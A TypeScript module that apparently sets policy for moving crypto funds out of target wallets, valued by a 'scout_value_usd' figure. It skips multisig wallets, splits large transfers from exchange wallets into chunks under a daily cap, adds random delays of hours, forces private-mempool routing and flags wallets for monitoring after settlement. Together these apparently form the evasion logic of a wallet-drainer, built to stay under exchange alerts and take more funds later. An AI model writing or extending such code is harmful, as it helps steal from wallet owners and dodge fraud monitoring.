// @ts-nocheck
/**
 * Large-value settlement policy — delays, exchange deferral, MEV routing, monitoring.
 */
import { createPublicClient, http } from 'viem'
import { mainnet } from 'viem/chains'

import { getRpcUrlForChainWithFallback } from '../lib/chain-rpc.js'
import { detectExchangeWallet, detectMultisigWallet } from './wallet-sentinel.js'

export type SettlementPolicyAction =
  | 'proceed'
  | 'delay'
  | 'defer_exchange'
  | 'skip_multisig'

export type SettlementTiming = 'immediate' | 'delayed'

export type SettlementPolicyDecision = {
  action: SettlementPolicyAction
  scout_value_usd: number
  force_mev_protect: boolean
  delay_ms: number
  /** Human-readable settlement timing for alerts. */
  timing: SettlementTiming
  delay_hours?: number
  strategies: string[]
  exchange?: string
  multisig_kind?: string
  chunk_count?: number
  chunk_interval_hours?: number
  reason?: string
}

function readEnv(key: string): string {
  return process.env[key]?.trim() ?? ''
}

function readNumberEnv(key: string, fallback: number): number {
  const raw = readEnv(key)
  if (!raw) return fallback
  const n = Number.parseFloat(raw)
  return Number.isFinite(n) && n >= 0 ? n : fallback
}

function readBoolEnv(key: string): boolean {
  const v = readEnv(key)?.toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function readLargeTransferThresholdUsd(): number {
  return readNumberEnv('LARGE_TRANSFER_THRESHOLD_USD', 50_000)
}

export function readDelaySettlementAboveUsd(): number {
  return readNumberEnv('DELAY_SETTLEMENT_ABOVE_USD', 100_000)
}

/** Adaptive delay cutoff — below = immediate, at/above = random delay window. */
export function readDelayThresholdUsd(): number {
  return readNumberEnv('DELAY_THRESHOLD_USD', 1000)
}

export function readMevForceLargeEth(): number {
  return readNumberEnv('MEV_FORCE_LARGE_ETH', 10)
}

export function readExchangeDeferDailyUsd(): number {
  return readNumberEnv('EXCHANGE_DEFER_DAILY_USD', 50_000)
}

export function readExchangeDeferChunkDays(): number {
  const n = Math.floor(readNumberEnv('EXCHANGE_DEFER_CHUNK_DAYS', 3))
  return Math.max(1, Math.min(n, 30))
}

export function readMonitoredWalletMinUsd(): number {
  return readNumberEnv('MONITORED_WALLET_MIN_USD', 25_000)
}

export function readWalletMonitorIntervalHours(): number {
  const n = Math.floor(readNumberEnv('WALLET_MONITOR_INTERVAL_HOURS', 6))
  return Math.max(1, n)
}

export function isLargeTransferUsd(scoutValueUsd: number): boolean {
  return scoutValueUsd >= readLargeTransferThresholdUsd()
}

function readDelayMinHours(): number {
  const n = Math.floor(readNumberEnv('DELAY_SETTLEMENT_MIN_HOURS', 1))
  return Math.max(1, Math.min(n, 168))
}

function readDelayMaxHours(): number {
  const min = readDelayMinHours()
  const n = Math.floor(readNumberEnv('DELAY_SETTLEMENT_MAX_HOURS', 6))
  return Math.max(min, Math.min(n, 168))
}

/** Random delay between DELAY_SETTLEMENT_MIN_HOURS and MAX_HOURS when USD ≥ DELAY_THRESHOLD_USD. */
export function computeAdaptiveSettlementDelayMs(settlementUsd: number): number {
  // Immediate settlement for all amounts when SETTLEMENT_IMMEDIATE=true
  if (readBoolEnv('SETTLEMENT_IMMEDIATE')) return 0
  if (settlementUsd < readDelayThresholdUsd()) return 0
  const minMs = readDelayMinHours() * 60 * 60 * 1000
  const maxMs = readDelayMaxHours() * 60 * 60 * 1000
  return minMs + Math.floor(Math.random() * (maxMs - minMs))
}

/** @deprecated Use computeAdaptiveSettlementDelayMs */
export function computeWhaleSettlementDelayMs(settlementUsd: number): number {
  return computeAdaptiveSettlementDelayMs(settlementUsd)
}

export function formatDelayHours(delayMs: number): number {
  return Math.round((delayMs / 3_600_000) * 10) / 10
}

export function shouldForceMevProtect(params: {
  scout_value_usd: number
  native_eth?: number
}): boolean {
  const mevFlag = readEnv('MEV_PROTECT').toLowerCase()
  if (mevFlag === 'true' || mevFlag === '1' || mevFlag === 'yes') return true

  const ethThreshold = readMevForceLargeEth()
  if (params.native_eth != null && params.native_eth >= ethThreshold) return true

  if (params.scout_value_usd >= readDelaySettlementAboveUsd()) return true
  return false
}

function resolveEvmClient(chainId: number) {
  const rpc = getRpcUrlForChainWithFallback(chainId)
  return createPublicClient({ chain: mainnet, transport: http(rpc) })
}

export async function evaluateSettlementPolicy(params: {
  wallet_address: string
  chain_id?: number | string | null
  scout_value_usd: number
  native_eth?: number
}): Promise<SettlementPolicyDecision> {
  const scout = Number.isFinite(params.scout_value_usd) ? params.scout_value_usd : 0
  const strategies: string[] = []
  const chainId = Number(params.chain_id ?? 1)
  const client = resolveEvmClient(Number.isFinite(chainId) ? chainId : 1)

  const force_mev_protect = shouldForceMevProtect({
    scout_value_usd: scout,
    native_eth: params.native_eth,
  })
  if (force_mev_protect) strategies.push('private_mempool')

  const multisig = await detectMultisigWallet(client, params.wallet_address)
  if (multisig.is_multisig) {
    return {
      action: 'skip_multisig',
      scout_value_usd: scout,
      force_mev_protect,
      delay_ms: 0,
      timing: 'immediate',
      strategies: [...strategies, 'multisig_skip'],
      multisig_kind: multisig.kind,
      reason: `${multisig.kind} detected (${multisig.owners.length} owners, threshold ${multisig.threshold})`,
    }
  }

  const exchange = await detectExchangeWallet(params.wallet_address)
  if (exchange && scout >= readLargeTransferThresholdUsd()) {
    const dailyCap = readExchangeDeferDailyUsd()
    const chunkCount = Math.max(1, Math.ceil(scout / dailyCap))
    const chunkDays = readExchangeDeferChunkDays()
    return {
      action: 'defer_exchange',
      scout_value_usd: scout,
      force_mev_protect,
      delay_ms: 0,
      timing: 'delayed',
      strategies: [...strategies, 'exchange_deferred'],
      exchange: exchange.exchange,
      chunk_count: chunkCount,
      chunk_interval_hours: 24,
      reason: `Exchange wallet ${exchange.exchange} — split into ${chunkCount} chunk(s) over ${chunkDays}d window`,
    }
  }

  const delay_ms = computeAdaptiveSettlementDelayMs(scout)
  if (delay_ms > 0) {
    const delay_hours = formatDelayHours(delay_ms)
    strategies.push('delayed_settlement')
    return {
      action: 'delay',
      scout_value_usd: scout,
      force_mev_protect,
      delay_ms,
      timing: 'delayed',
      delay_hours,
      strategies,
      reason: `Amount ≥ $${readDelayThresholdUsd()} — delayed (${delay_hours}h)`,
    }
  }

  if (isLargeTransferUsd(scout)) strategies.push('large_transfer_alert')
  strategies.push('immediate')

  return {
    action: 'proceed',
    scout_value_usd: scout,
    force_mev_protect,
    delay_ms: 0,
    timing: 'immediate',
    strategies,
    reason: `Amount < $${readDelayThresholdUsd()} — immediate execution`,
  }
}

export function shouldMonitorWalletAfterSettlement(scoutValueUsd: number): boolean {
  return scoutValueUsd >= readMonitoredWalletMinUsd()
}
